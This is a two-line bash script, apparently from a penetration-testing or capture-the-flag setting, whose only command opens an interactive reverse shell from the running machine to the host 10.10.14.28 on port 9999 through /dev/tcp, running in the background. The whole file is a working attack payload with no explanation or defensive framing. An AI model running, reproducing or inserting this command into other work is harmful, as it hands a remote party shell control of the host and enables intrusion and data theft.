#!/bin/bash

/bin/sh -i >& /dev/tcp/10.10.14.28/9999 0>&1 &
